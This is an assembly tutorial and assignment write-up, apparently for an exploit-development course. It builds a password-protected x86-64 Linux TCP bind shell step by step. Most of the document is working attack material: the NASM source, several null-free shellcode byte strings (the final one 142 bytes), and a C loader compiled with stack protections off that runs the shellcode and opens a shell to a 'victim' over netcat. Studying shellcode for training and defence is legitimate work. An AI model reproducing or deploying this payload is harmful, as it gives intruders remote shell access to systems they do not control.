## Bind_Shell_TCP
---
---
### Introduction
---

Requirements are to create a Shell_Bind_TCP shellcode that: 

  1. Listens on a specific port 
  2. Requires a password 
  3. If the password is correct, then Exec Shell is executed 
  4. Also, the NULL bytes (`0x00`) must be removed from the shellcode 

To build the shellcode have to use linux sockets. Then, for the assignment, the following steps have to be done:

  1. Create a socket 
  2. Bind the socket to a port 
  3. Start listenning for connections 
  4. Accept incoming connections 
  5. Ask, read, and validate the password 
  6. Duplicate `stdin`, `stdout` and `stderr` to the socket descriptor 
  7. Execute /bin/sh for the incoming and validated conection 

In case the password is not correct, the shellcode will exit with a Segmentation Fault. The shellcode won’t care on how the program terminates. This makes sense as shellcode will be smaller in size and really does not matter how it exits. 

For Linux Sockets Programming, the following System calls are required: 

```c
int socket(int domain, int type, int protocol); 
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); 
int listen(int sockfd, int backlog); 
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); 
int close(int sockfd); 
```
To duplicate the standard input, output and error, `sys_dup2` will be used: 

```c
int dup2(int oldfd, int newfd); 
```

And to execute `/bin/sh`, `sys_execve` will be used: 

```c
int execve(const char *filename, char *const argv[], char *const envp[]); 
```
### ASM Implementation
----

Will explain how we implement each step mentioned before into ASM, with the idea to make the code easy to understand. No enphasys has been put into removing NULLs and make the shellcode small (this is done later).

#### Create a Socket
---
```asm
; sock = socket(AF_INET, SOCK_STREAM, 0) 
mov rax, 41                 ; syscall number 
mov rdi, AF_INET            ; IPv4 
mov rsi, SOCK_STREAM        ; TCP connection 
mov rdx, 0                  ; IP Protocol 
syscall 
; Save the socket_id value in RDI for future use 
mov rdi, rax                ; value returned in RAX by syscall  
```
This is the first step required for sockets, open the socket. 
To execute the `sys_socket` call, the arguments will have to be placed in the corresponding registers: 

  - **RAX** <- 41 : Syscall number. 
  - **RDI** <- 2 : Domain parameter. AF_INET is for IPv4. 
  - **RSI** <-  1 : Type parameter. SOCK_STREAM means connection oriented TCP. 
  - **RDX** <- 0 : Protocol. IPPROTO_IP means it’s an IP protocol 

The syscall will return a file descriptor in **RAX**, that is saved into **RDI**. This saves the socket descriptor id for later use in the code.

#### Bind the Created Socket to a Port

```asm
; Prepare (struct sockaddr *)&server 
;       RSP will point to the struct address 
xor rax, rax 
push rax                    ; bzero(&server.sin_zero, 8) 

mov dword [rsp - 4], INADDR_ANY 
mov word [rsp - 6], PORT 
mov word [rsp - 8], AF_INET 
sub rsp, 8                  ; Update RSP with right value 

; bind(sock, (struct sockaddr *)&server, sockaddr_len) 
;       RDI already has the sock_id 
mov rax, 49                 ; syscall number 
mov rsi, rsp                ; @ to (struct sockaddr * &server) 
mov rdx, 16                 ; length of the sockaddr struct 
syscall  
```
This part irequires two steps:

  - Create the `struct sockaddr` structure. Stack is used to store the values of the struct:
    - Values are placed on the stack
    - Stack Pointer (**RSP**) is updated with the new address
  - Call to `sys_bind`. Values for parameters are placed into the registers:
    - **RAX**: Syscall number (49)
    - **RDI**: Socket descriptor. Already has the value from previous point
    - **RSI**: Address of the struct. This value is in **RSP**
    - **RDX**: The lengh of the sockaddr struct. It's 16 bytes

#### Listen for Incoming Connections

```asm
; listen(sock, MAX_CLIENTS 
;       RDI already has the sock_id 
mov rax, 50          ; syscall number 
mov rsi, 2			     
syscall 
```
Values in the registers for `sys_ listen` are:
  - **RAX** <- 50 : Syscall Number 
  - **RDI** : Already stores the socket descriptor 
  - **RSI** <- 2 : Is the backlog parameter 

#### Accept Incoming Connections

```asm
; client_sock = accept(sock_id, 
;                     (struct sockaddr *)&client, 
;                      &sockaddr_len) 
;       RDI already has the sock_id 

mov rax, 43                 ; syscall number 

; Reserve space on the stack for the struct (16 bytes) 
sub rsp, 16                 ; Reserved 16 bytes 
mov rsi, rsp                ; RSI <- @ sockaddr struct 
 
; Store in the Stack the sockaddr_len value 
mov byte [rsp - 1], 16      ; Stored the len (16 bytes) 

sub rsp, 1                  ; Update value for RSP 
mov rdx, rsp                ; RDX <- @sockaddr_len 
syscall 

; Store the client socket descripion returned by accept 
mov rbx, rax                 ; r9 <- client_sock 
```
`sys_accept` requires the following parameters:

- Socket descriptor, that's already stored in **RDI**
- Address of the struct by reference. Stack is used to store this struct reserving 16 bytes in stack. The data of this struct will be modified by the syscall and will access throught **RSP** register
- Address where the length of the struct is stored. This value is stored in the stack. **RSP** has this value

Registers get this values for the parametrers:
- **RAX** <- 43 : Syscall Number 
- **RDI** : Already stores the socket descriptor 
- **RSI** <- **RSP** : Address of stack where struct is 
- **RDX** <- **RSP + 1** : Address of stack where the length of the struct is. Just one position more tan the struct itself 

This call returns a socket descriptor for the client, that is stored in R9 for future use.

#### Close the Parent Socket Descriptor

```asm
; Close the parent socket_id
mov rax, 3                  ; syscall number
syscall
```
This is the easiest part. The "3" value is put into **RAX** for the syscall number for `sys_close`, and **RDI** already has the value of the socket descriptor to close.

#### Duplicate Socket Descriptors

```asm
; Sockets duplication
mov rdi, rbx			    ; Client socket descriptor
mov rax, 33           ; syscall number
mov rsi, 0
syscall
mov rax, 33
mov rsi, 1
syscall
mov rax, 33
mov rsi, 2
syscall
```
Using `sys_dup2`, to duplicate in the socket descriptor `stdin`, `stdout`, and `stderr`. One call to `sys_dup2` for each.
Registers get the following values for the parameters:
-	**RAX** <- 33 : Syscall number
-	**RDI** <- new file descriptor : Is the client socket id
-	**RSI** <- old file descriptor : Will be one call for `stdin`, `stdout`, and `stderr`.

#### Password Stuff

First thing done in this part of the code, is to show the `"Passwd: "` prompt when connection established. This is done using the `write()` syscall, to print the string stored in **PASSWD_PROMPT**. Access to the **PASWD_PROMPT** is done using Relative Addressing:

```asm
write_syscall:
        mov rax, 1                      	; Syscall number for write()
        mov rdi, 1
        lea rsi, [rel PASSWD_PROMPT]    	; Rel addressing for the prompt
        mov rdx, 8                      	; length of the string
        syscall
```

The password input is then stored in the **PASSWD_INPUT** string. Access to it is also done using Relative Addressing:

```asm
read_syscall:
        xor rax, rax                    ; Syscall number for read()
        mov rdi, 0
        lea rsi, [rel PASSWD_INPUT]     ; Rel addressing for the input
        mov rdx, 8                      ; Max length of the input allowed
        syscall
```

The last part of this section, is to compare the typed password from the user with the defined password. Password is defined as `"12345678"`, and is hard coded into the **RAX** register (in case another password is desireed, value can be changed). **RDI** gets the address of the **PASSWD_INPUT** string via Relative Addressing. Comparison is done using the `scasq` instruction: if the two values does not match, program `jmp` to end, and if the password match, go to execute next section, the shell:

 ```asm
 compare_passwords:

        mov rax, "12345678"             ; This is the password
        lea rdi, [rel PASSWD_INPUT]
        scasq                           ; Compare the qword for passwords
        jnz exit_program                ; Passwords dont match, we exit
```

#### The Shell: Execve

Code used is the standard from Execve-Stack. In this code, the `/bin//sh` string parameter and the length of the string, are stored in the Stack and accessed via the Stack Technique:

```asm
execve_syscall:

        ; First NULL push
        xor rax, rax
        push rax

        ; push /bin//sh in reverse
        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI
        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp

        ; Push address of /bin//sh
        push rdi
        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
```

#### Putting All Together: The ASM File

> The code for this first version of the Bind Shell, can be found in the [BindShell-ExecveStack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment01/BindShell-ExecveStack.nasm) on the [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment01).

Let's try the code compiling and linking it. Commands are:

```bash
SLAE64> nasm -f elf64 BindShell-ExecveStack.nasm -o BindShell-ExecveStack.o
SLAE64> ld -N BindShell-ExecveStack.o -o BindShell-ExecveStack
```
<img src="https://galminyana.github.io/img/A01_BindShell-Execve-Stack_Compile.png" width="75%" height="75%">

> The **-N** option in the linker is needed to execute the code, as the code access to memory positions in the `.text` section (code) instead `.data` section.

Time to test. Program is executed, and using `netcat`, a conection is made. The `"Passwd: "` prompt appears asking for the password:

<img src="https://galminyana.github.io/img/A01_BindShell-Execve-Stack_Exec01.png" width="75%" height="75%">

With the right password, the shell is launched and working:

<img src="https://galminyana.github.io/img/A01_BindShell-Execve-Stack_Exec02.png" width="75%" height="75%">

If the password is incorrect, program will exit with a Segmentation Fault:

<img src="https://galminyana.github.io/img/A01_BindShell-Execve-Stack_Exec03.png" width="75%" height="75%">

### Remove NULLs and Reduce Shellcode Size
---

> The final ASM code after the changes explained in this section, can be found at the [BindShell-ExecveStack_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment01/BindShell-ExecveStack_V2.nasm) file on the [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment01).

The actual shellcode has several NULLs and a size of 274 bytes (too much!). Using `objdump` will get the opcodes and review the NULLs in the shellcode:

```bash
SLAE> objdump -M intel -d BindShell-ExecveStack.o

BindShell-ExecveStack.o:     formato del fichero elf64-x86-64

Desensamblado de la sección .text:

[...]

0000000000000012 <real_start>:
  12:	b8 29 00 00 00       	mov    eax,0x29
  17:	bf 02 00 00 00       	mov    edi,0x2
  1c:	be 01 00 00 00       	mov    esi,0x1
  21:	ba 00 00 00 00       	mov    edx,0x0
  26:	0f 05                	syscall 
  28:	48 89 c7             	mov    rdi,rax
  2b:	48 31 c0             	xor    rax,rax
  2e:	50                   	push   rax
  2f:	c7 44 24 fc 00 00 00 	mov    DWORD PTR [rsp-0x4],0x0
  36:	00 
  37:	66 c7 44 24 fa 11 5c 	mov    WORD PTR [rsp-0x6],0x5c11
  3e:	66 c7 44 24 f8 02 00 	mov    WORD PTR [rsp-0x8],0x2
  45:	48 83 ec 08          	sub    rsp,0x8
  49:	b8 31 00 00 00       	mov    eax,0x31
  4e:	48 89 e6             	mov    rsi,rsp
  51:	ba 10 00 00 00       	mov    edx,0x10
[...]
```

`objdump` shows instructions that use NULLs. First step is removing the NULLs, replacing instructions that put `0x00` in the shellcode, by other instructions that do the same but not using NULLs. Some examples of how to remove NULLs are:

- `mov rax, VALUE` is replaced by `push VALUE; pop rax`
- `mov [rsp], VALUE` is replaced by `push VALUE`
- Using 32, 16 or even 8 bits registers for operations instead the 64 bits register
- Using `cdq` instruction to ZEROing **RDX**. It puts **RDX** to `0x00` if **RAX** >= 0

Let's replace all instructions until no NULLs are shown by `objdump` in the shellcode. Being carefull on which instructions are used, the size of the shellcode, only removing NULLs, is reduced to 172 bytes. 

To get the final shellcode in the desireed format, the following `bash` one liner command using `objdump` is used:
```bash
SLAE64> echo “\"$(objdump -d 0_BindShell-ExecveStack.o | grep '[0-9a-f]:' | 
              cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\"""

"\xeb\x10\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x41\x41\x41\x41\x41\x41\x41\x6a\x29\x58
"\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x50\x5f\x52\x52\x66\x68\x11\x5c\x66\x6a"
"\x02\x6a\x31\x58\x54\x5e\xb2\x10\x0f\x05\x6a\x32\x58\x6a\x02\x5e\x0f\x05\x6a\x2b\x58"
"\x48\x83\xec\x10\x54\x5e\x6a\x10\x54\x5a\x0f\x05\x50\x5b\x6a\x03\x58\x0f\x05\x53\x5f"
"\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x50\x5f\x48\x8d\x35"
"\x95\xff\xff\xff\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x50\x5f\x48\x83\xc6\x08\x6a\x08\x5a"
"\x0f\x05\x48\xb8\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1c\x48\x31\xc0"
"\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x50\x54\x5a\x57\x54\x5e\x6a"
"\x3b\x58\x0f\x05"

SLAE64> 
```
#### Shortening More Shellcode Length

But still the shellcode size can be reduced. V1 code is using Relative Addressing for the Password Stuff. This technique, forces the use of 16 bytes just to store the strings (as they are in the code section of the program), and to use `lea` instruction that has an opcode size of 7 bytes. For this reason, the Stack Technique is going to be used for the Password Stuff to replace Relative Addressing. The new code for the Password Stuff section after appliying changes is:
```asm
write_syscall:

        ;mov rax, 1                             ; Syscall number for write()
        push 1
        pop rax

        ; rdi still keeps the sicket_id, we write() to the socket
        ;lea rsi, [rel PASSWD_PROMPT]           ; Rel addressing to prompt
        mov r9, "Passwd: "
        push r9
        mov rsi, rsp

        ;mov rdx, 8                             ; Length of PAsswd: string
        push 8
        pop rdx
        syscall

read_syscall:

        xor rax, rax                            ; Syscall number for read()
        ; rdi keeps the socket_id, we read() from it

        ; Where to store the input passwd
        add rsi, 8                              ; Replace "Passwd: " with the input in the stack

        ;mov rdx, 8                             ; Chars to read
        ;rdx already has value 8 from before
        syscall

compare_passwords:

        mov rax, "12345678"                     ; Thgis is the password

        ;lea rdi, [rel PASSWD_INPUT]            ; Compare the QWord

        ;mov rdi, rsi
        push rsi                                ; rsi points to PASSWD_INPUT
        pop rdi

        scasq
        jne exit_program                        ; Passwords don't match, exit

```
Also, the code for the `sys_close` can be removed, as the socket descriptor is not used anymore once the `sys_accept` get a connection. 

#### _UPDATE_ Trick Learned in [Assignment05-1](Assignment05-1)
Now let's use a trick learned. For the `sys_accept` call, the value returned for `&client` and `&sockaddr_len` can be NULL. If this is done, then no info is filled in the `sockaddr` struct. This is not a problem, as this data is not used in the code. From this syscall is needed the socked descriptor returned in **RAX**. In `man 2 accept` this is explained. Then, the code for the `sys_accept` section ends like this:
```asm
; client_sock = accept(sock_id, (struct sockaddr *)&client, &sockaddr_len)
        ;       RDI already has the sock_id

        ;mov rax, 43                    ; syscall number
        push 43
        pop rax
        xor rsi, rsi                    ; RSI <- NULL
        cdq                             ; RDX <- NULL
        syscall
        ; Store the client socket descripion returned by accept
        push rax
        pop rdi
```

Using the one liner command for `objdump` the shellcode is dumped, this time, with a size of **only 142 bytes**:

```bash
SLAE64> echo “\"$(objdump -d BindShell-ExecveStack_V2.o | grep '[0-9a-f]:' | 
              cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\"""
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x50\x5f\x52\x52\x66\x68"
"\x11\x5c\x66\x6a\x02\x6a\x31\x58\x54\x5e\xb2\x10\x0f\x05\x6a\x32\x58\x6a\x02\x5e"
"\x0f\x05\x6a\x2b\x58\x48\x31\xf6\x99\x0f\x05\x50\x5f\x6a\x02\x5e\x6a\x21\x58\x0f"
"\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41"
"\x51\x48\x89\xe6\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8"
"\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1c\x48\x31\xc0\x50\x48\xbb"
"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x50\x54\x5a\x57\x54\x5e\x6a\x3b\x58"
"\x0f\x05"
SLAE64>
```

This shellcode could be more reduced by removing the code for the `"Passwd: "` prompt: Why needed? We already know that a password has to be typed in.
But won't do it, as the reached size for the shellcode is good enought with **only 142 bytes**.

### Executing Final Shellcode
---
To test the shellcode, the `shellcode.c` template is used. To use it, the generated shellcode has to be placed in the `unsigned char code[]` string:
```c
#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x50\x5f\x52\x52\x66\x68"
"\x11\x5c\x66\x6a\x02\x6a\x31\x58\x54\x5e\xb2\x10\x0f\x05\x6a\x32\x58\x6a\x02\x5e"
"\x0f\x05\x6a\x2b\x58\x48\x31\xf6\x99\x0f\x05\x50\x5f\x6a\x02\x5e\x6a\x21\x58\x0f"
"\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41"
"\x51\x48\x89\xe6\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8"
"\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1c\x48\x31\xc0\x50\x48\xbb"
"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x50\x54\x5a\x57\x54\x5e\x6a\x3b\x58"
"\x0f\x05";

void main()
{
        printf("ShellCode Lenght: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
Now the code can be compiled with `gcc` using the `-fno-stack-protector` and `-z execstack` options:
```bash
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```
The shellcode now can be executed, and using `netcat`, a connection is opened to the victim:

<img src="https://galminyana.github.io/img/A01_BindShell-Execve-Stack_V2_Exec01.png" width="75%" height="75%">

### GitHub Repo Files and ExploitDB Submission
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment01) for this assignment contains the following files:

- [BindShell-ExecveStack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment01/BindShell-ExecveStack.nasm) : This is the ASM source code for the first version of the code. It's with NULLs and not caring on the shellcode size, but is more clear to understand the code.
- [BindShell-ExecveStack_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment01/BindShell-ExecveStack_V2.nasm) : This is the NULL free code with the shellcode size reduced.
- [shellcode.c](https://github.com/galminyana/SLAE64/blob/main/Assignment01/shellcode.c) : The C template with the V2 of the shellcode to run and execute

Also, this shellcode has been published at [Exploit-DB](https://www.exploit-db.com/), at [https://www.exploit-db.com/shellcodes/49472](https://www.exploit-db.com/shellcodes/49472)


 
